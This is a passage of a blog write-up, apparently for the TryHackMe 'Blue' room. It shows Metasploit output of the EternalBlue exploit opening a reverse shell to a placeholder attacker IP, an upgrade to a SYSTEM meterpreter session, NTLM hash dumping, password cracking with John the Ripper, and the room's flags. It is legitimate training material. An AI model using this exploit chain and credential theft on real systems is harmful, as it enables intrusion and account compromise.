</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - 0x00000000  <span style=color:#ae81ff>57</span> <span style=color:#ae81ff>69</span> 6e <span style=color:#ae81ff>64</span> 6f <span style=color:#ae81ff>77</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>37</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>72</span> 6f <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>73</span>  Windows <span style=color:#ae81ff>7</span> Profes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - 0x00000010  <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>69</span> 6f 6e <span style=color:#ae81ff>61</span> 6c <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>37</span> <span style=color:#ae81ff>36</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>31</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>53</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>76</span>  sional <span style=color:#ae81ff>7601</span> Serv
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - 0x00000020  <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>63</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>63</span> 6b <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>31</span>                    ice Pack <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Target arch selected valid <span style=color:#66d9ef>for</span> arch indicated.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Trying exploit with <span style=color:#ae81ff>12</span> Groom Allocations.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Sending all but last fragment.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Starting non-paged pool grooming
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Sending SMBv2 buffers
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Sending final SMBv2 buffers.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Sending last fragment of exploit packet!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Receiving response from exploit packet
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - ETERNALBLUE overwrite completed successfully <span style=color:#f92672>(</span>0xC000000D<span style=color:#f92672>)</span>!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Sending egg to corrupted connection.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:445 - Triggering free of corrupted buffer.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command shell session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>([</span>ATTACKER_IP<span style=color:#f92672>]</span>:4444 -&gt; <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:49158<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;
</span></span></code></pre></div><p>Success! We now have a shell on the target system.</p><h2 id=task-3-privilege-escalation>Task 3: Privilege Escalation<a hidden class=anchor aria-hidden=true href=#task-3-privilege-escalation>#</a></h2><h3 id=upgrading-to-meterpreter>Upgrading to Meterpreter<a hidden class=anchor aria-hidden=true href=#upgrading-to-meterpreter>#</a></h3><p>For better post-exploitation capabilities, let&rsquo;s upgrade our shell to a Meterpreter session:</p><ol><li><strong>Background the current shell:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt; ^Z
</span></span><span style=display:flex><span>Background session 1? <span style=color:#f92672>[</span>y/N<span style=color:#f92672>]</span>  y
</span></span></code></pre></div><ol start=2><li><strong>Use the shell to meterpreter module:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; use post/multi/manage/shell_to_meterpreter
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>post/multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name     Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----     ---------------  --------  -----------
</span></span><span style=display:flex><span>   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
</span></span><span style=display:flex><span>   LHOST                     no        IP of host that will receive the connection from the payload
</span></span><span style=display:flex><span>   LPORT    <span style=color:#ae81ff>4433</span>             yes       Port <span style=color:#66d9ef>for</span> payload to connect to
</span></span><span style=display:flex><span>   SESSION                   yes       The session to run this module on
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Set the session ID</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; set SESSION <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>SESSION <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><ol start=3><li><strong>Execute the upgrade:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Upgrading session ID: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting exploit/multi/handler
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on <span style=color:#f92672>[</span>ATTACKER_IP<span style=color:#f92672>]</span>:4433
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>206403</span> bytes<span style=color:#f92672>)</span> to <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>2</span> opened <span style=color:#f92672>([</span>ATTACKER_IP<span style=color:#f92672>]</span>:4433 -&gt; <span style=color:#f92672>[</span>TARGET_IP<span style=color:#f92672>]</span>:49159<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stopping exploit/multi/handler
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Post module execution completed
</span></span></code></pre></div><ol start=4><li><strong>Interact with the new Meterpreter session:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions -i <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 2...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; getuid
</span></span><span style=display:flex><span>Server username: NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM
</span></span></code></pre></div><p>Excellent! We have <strong>NT AUTHORITY\SYSTEM</strong> privileges, which means we have full administrative access to the machine.</p><h2 id=task-4-cracking-passwords>Task 4: Cracking Passwords<a hidden class=anchor aria-hidden=true href=#task-4-cracking-passwords>#</a></h2><h3 id=dumping-password-hashes>Dumping Password Hashes<a hidden class=anchor aria-hidden=true href=#dumping-password-hashes>#</a></h3><p>Now let&rsquo;s extract password hashes from the system:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; hashdump
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</span></span></code></pre></div><h3 id=cracking-with-john-the-ripper>Cracking with John the Ripper<a hidden class=anchor aria-hidden=true href=#cracking-with-john-the-ripper>#</a></h3><p>Let&rsquo;s save the hash for user &ldquo;Jon&rdquo; and crack it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Save Jon&#39;s hash to a file</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&#34;</span> &gt; jon_hash.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Crack with John the Ripper</span>
</span></span><span style=display:flex><span>john --format<span style=color:#f92672>=</span>NT jon_hash.txt --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>NT <span style=color:#f92672>[</span>MD4 256/256 AVX2 8x3<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Warning: no OpenMP support <span style=color:#66d9ef>for</span> this hash type, consider --fork<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>alqfna22         <span style=color:#f92672>(</span>Jon<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1g 0:00:00:02 DONE <span style=color:#f92672>(</span>2020-09-14 18:45<span style=color:#f92672>)</span> 0.4545g/s 4644Kp/s 4644Kc/s 4644KC/s alqui..alpus
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show --format=NT&#34;</span> option to display all of the cracked passwords.
</span></span></code></pre></div><p><strong>Jon&rsquo;s password:</strong> <code>alqfna22</code></p><h3 id=finding-the-flags>Finding the Flags<a hidden class=anchor aria-hidden=true href=#finding-the-flags>#</a></h3><ol><li><strong>User Flag:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; cat C:/Users/Jon/Desktop/user.txt
</span></span><span style=display:flex><span>02930c4e94b5b8cf31ce8c35e2a7a0cd
</span></span></code></pre></div><ol start=2><li><strong>Root Flag:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; cat C:/Users/Administrator/Desktop/root.txt
</span></span><span style=display:flex><span>89ad74b51a55c4d1b2c0b9d6b0b86d5e
</span></span></code></pre></div><h2 id=lessons-learned>Lessons Learned<a hidden class=anchor aria-hidden=true href=#lessons-learned>#</a></h2><ol><li><strong>MS17-010 Impact</strong>: The EternalBlue vulnerability demonstrates how a single unpatched vulnerability can lead to complete system compromise</li><li><strong>Metasploit Framework</strong>: Understanding how to use Metasploit effectively for exploitation and post-exploitation</li><li><strong>Session Management</strong>: Learning to upgrade shells and manage multiple sessions</li><li><strong>Password Security</strong>: The importance of strong passwords, as demonstrated by cracking Jon&rsquo;s weak password</li><li><strong>Patch Management</strong>: Critical systems must be kept up-to-date with security patches</li></ol><h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2><p>Blue effectively demonstrates the exploitation of one of the most significant vulnerabilities in recent history. The MS17-010 EternalBlue vulnerability highlights the importance of:</p><ul><li>Regular system patching</li><li>Network segmentation</li><li>Intrusion detection systems</li><li>Strong password policies</li></ul><p>This room provides an excellent introduction to using Metasploit for exploitation and post-exploitation activities, making it perfect for beginners learning penetration testing fundamentals.</p><h2 id=key-takeaways>Key Takeaways<a hidden class=anchor aria-hidden=true href=#key-takeaways>#</a></h2><ul><li><strong>3 ports open under 1000</strong>: 135, 139, 445</li><li><strong>Vulnerability</strong>: MS17-010 (EternalBlue)</li><li><strong>Exploit path</strong>: <code>exploit/windows/smb/ms17_010_eternalblue</code></li><li><strong>Required option</strong>: <code>RHOSTS</code></li><li><strong>Shell upgrade module</strong>: <code>post/multi/manage/shell_to_meterpreter</code></li><li><strong>Jon&rsquo;s password</strong>: <code>alqfna22</code></li></ul><hr><p><em>This writeup is for educational purposes only. Always ensure you have proper authorization before testing any techniques.</em></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/metasploit/>Metasploit</a></li><li><a href=https://s4ch.github.io/tags/ms17-010/>Ms17-010</a></li><li><a href=https://s4ch.github.io/tags/eternalblue/>Eternalblue</a></li><li><a href=https://s4ch.github.io/tags/beginner/>Beginner</a></li><li><a href=https://s4ch.github.io/tags/smb/>Smb</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>